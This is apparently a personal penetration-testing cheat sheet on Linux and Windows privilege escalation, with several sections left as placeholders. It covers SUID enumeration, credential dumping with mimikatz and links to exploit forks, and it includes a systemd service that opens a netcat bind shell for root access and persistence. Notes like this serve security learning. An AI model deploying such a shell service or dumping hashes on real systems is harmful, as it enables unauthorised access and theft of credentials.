---
title: "Privilege Escalation"
---

<p style="text-align: right">_- last update 09/08/2022 -_</p>

## Tools

* [AutoSUID](https://github.com/IvanGlinkin/AutoSUID): automate harvesting the SUID executable files and to find a way for further escalating the privileges.

## On linux

Look at the current user and it's rights : `id`

Look for the sudo rights, maybe a command can be abused : `sudo -l`

### SUID

The [AutoSUID](https://github.com/IvanGlinkin/AutoSUID) tool is automating the following process.

The following oneliner is listing every file with SGID or SUID flag enabled, ignoring errors and outputing resutis in a file.

```bash
find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \; 2>/dev/null | tee suid_sgid_files.txt
```

Command details

```txt
find \                # lister tout les fichiers
  / \                 # depuis la racine
  -perm -4000 \       # qui ont le bit SUID d'activer
  -o \                # OU (-or)
  -perm -2000 \       # le bit SGID d'activé
  -exec ls -ldb {} \; # pour chaque fichier, afficher en uilisant la commande ls
```

Once you have this binary list, you can search for a way to escalate privileges from [GTFOBins](https://gtfobins.github.io/) website.

### Systemctl

If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance.

```systemd
[Service]
Type=oneshot
ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
[Install]
WantedBy=multi-user.target
```

## On Windows

### Common Enumeration

Automated: [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

List local users.

```cmd
net users
```

List sensitiv system informations to look for public vulns.

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

List services:

```cmd
wmic service list
```

### Stored Credentials

**SAM (Security Accounts Manager)**: It's a system database that store authentication related data (mdp, hash, ...).

There are 2 types of hash to autenticate users:

* **LM (LAN Manager)**: old, vulnerable to brute-force
* **NTLM (NT LAN Manager)**: modern, robust

**LSASS (Local Security Authority Subsystem Service)**: process that talks to the **SAM** to compare hashes / get mdps.

**LSASS** temporary store passwords in plaintext. To allow kind of an SSO.

You can use [mimikatz](https://github.com/gentilkiwi/mimikatz) to dump **SAM**'s hashes and break them with [John the Ripper](https://www.openwall.com/john/) !

_Incomming (applications storage, configuration files, ...)_

### Windows Kernel Exploits

_Incomming ..._

### Insecure File/Folder Permissions

_Incomming ..._

### Insecure Service Permissions

_Incomming ..._

### DLL Hijacking

_Incomming ..._

### Unquoted Service Path

Il est assez courant de pouvoir remplacer des exe ou d'habuser de chemins
windows. Par exemple voir si on peut renommer des exe qui sont executés
periodiquement par **WindowsScheduler**.

_Incomming ..._

### AlwaysInstallElevated policy

(custom MSI installations)

The InstallerFileTakeOver vulnerability:

* [original github (down)](https://github.com/klinix5/InstallerFileTakeOver)
* [from internet archive](https://archive.org/details/github.com-klinix5-InstallerFileTakeOver_-_2021-11-25_01-39-13)
* [fork](https://github.com/szybnev/cmd32)
* [fork](https://github.com/AlexandrVIvanov/InstallerFileTakeOver)
* [fork](https://github.com/noname1007/InstallerFileTakeOver)

### Vulnerable privileged Software

_Incomming ..._

